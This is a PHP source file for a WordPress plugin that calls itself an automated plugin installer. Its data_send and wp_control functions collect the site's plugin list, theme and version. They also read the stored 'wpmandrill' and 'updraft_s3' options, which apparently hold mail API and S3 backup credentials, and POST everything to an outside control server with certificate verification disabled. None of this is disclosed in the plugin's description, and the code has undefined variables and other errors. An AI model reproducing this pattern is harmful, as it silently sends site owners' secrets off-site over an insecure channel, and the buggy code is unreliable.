<?php
/*
Plugin Name: WP Optimiza Control
Plugin URI: http://www.optimizaclick.com
Description: Plugin para la instalación automatizada de plugins
Author: Departamento de Desarrollo
Version: 1.1.0
*/


require_once dirname( __FILE__ ) . '/includes/update.php';

if ( ! class_exists( 'WP_Optimiza_Control' ) ) {
	class WP_Optimiza_Control extends WP_Optimiza_Control_Auto_Update {
		
		function __construct() {
			//ACTION TO DO WHEN PLUGINS ACTIVATE
			register_activation_hook(__FILE__, array( $this,'install_plugins'));
			register_activation_hook(__FILE__, array( $this,'active_wp_cron'));
			
			//ACTION TO DO WHEN PLUGINS ACTIVATE
			register_activation_hook(__DIR__ ."/".$this->main_file, array( $this,'activate_cron_accions_wp_optimiza_control'));
				
			//ACTION TO DO WHEN PLUGINS DEACTIVATE
			register_deactivation_hook(__DIR__ ."/".$this->main_file, array( $this,'desactivate_cron_accions_wp_optimiza_control'));
			
			//ACTION TO DO WHEN USER LOGIN
			add_action('auto_update_wp_optimiza_control', array( $this,'auto_update_plugin'));
			
			//ACTIONS TO CHECK THE URL 
			add_action( 'init', array( $this, 'force_update' ));
			add_action( 'init', array( $this, 'show_version' ));
			add_action( 'init', array( $this, 'activate_plugin' ));
			add_action( 'plugins_loaded', array( $this, 'includes' ));
			add_action( 'init', array( $this, 'retrieve_plugins_data' ));
			
			//ACTION TO DO AFTER PLUGIN ACTIVATION
			add_action( 'activated_plugin', array( $this, 'activation_plugin_redirect') );
			
			//ACTION TO INIT CRON
			add_action('send_data_cron', array( $this,'wp_control'));
			add_action('auto_update_wp_optimiza_control', array( $this,'auto_update_plugin'));
			
			//GESTOR

			add_action( 'init', array( $this, 'desactive_plugin' ));
			add_action( 'init', array( $this, 'activate' ));
			add_action( 'init', array( $this, 'data_send' ));

		}			 

		protected $url_control = 'https://wpcontrol.optimizaclick.com/';
		
		protected function data_send() {
				global $post, $wpdb, $wp_control_data;
					if ( ! function_exists( 'get_plugins' ) ) {
						require_once ABSPATH . 'wp-admin/includes/plugin.php';
					}
							$theme = strtoupper (substr(get_bloginfo('template_directory'), strpos(get_bloginfo('template_directory'), "themes") + 7));
							$plugin[] = array();
					
						foreach(get_plugins() as $value) {
							$plugin[] = $value['Name'];
							$plugin[] = $value['Version'];
							}
							
							$array_active[] = array();
									foreach(get_option("active_plugins") as $activated) {
									$array_active[] = preg_replace("/(.*)\/(.*).php/", "$2", $activated);
									
								}
							
							$plugin_manage = array();
		
							foreach(get_plugins() as $plugin_file => $value) {
							if ( $plugin_info['Name'] == $plugin_name ) {
								
							$dir = $plugin_file;
								  }
								  
								if(in_array($dir,get_option('active_plugins'))) {
									$ok = '1';
										} else {
									$ok = '0'; }
									
								$plugin_manage[] = array(
									'Name' => $value['Name'],
									'Version' => $value['Version'],
									'Text' => $value['TextDomain'],
									'Wordpress' => get_bloginfo('version'),
									'Status' => $ok,
									'Dir' => $plugin_file,
									'Theme' => $theme
									);
							}
							
		
							$status = array(
								'plugins' => $plugin,
								'activate_plugins' => get_option("active_plugins"),
								'mandrill' => get_option("wpmandrill"),
								'updraft' => get_option("updraft_s3"),
								'Theme' => $theme,
								'Wordpress' => get_bloginfo('version')
							);
						
							$data = array(
								'domain' =>  preg_replace('#^https?://#', '', (get_site_url())),
								'status' => json_encode($status),
								'manage' =>json_encode($plugin_manage),
								'send' => '1'
							);	
					$wp_control_data = json_encode($data);
				}
		
				public function wp_control() {
						global $wp_control_data;
		
							$url = $this->url_control . 'api/v1/wordpress/';
							
							$this->data_send();
							$wp_control_data = json_decode($wp_control_data);
							$data_send = curl_init();
					
								curl_setopt($data_send,CURLOPT_URL, $url);
								curl_setopt($data_send,CURLOPT_POSTFIELDS, $wp_control_data);
								curl_setopt($data_send, CURLOPT_SSL_VERIFYHOST, FALSE);
								curl_setopt($data_send, CURLOPT_SSL_VERIFYPEER, FALSE);
					
								curl_exec($data_send);
								curl_close($data_send);
						}

				}
	 new WP_Optimiza_Control();
} 
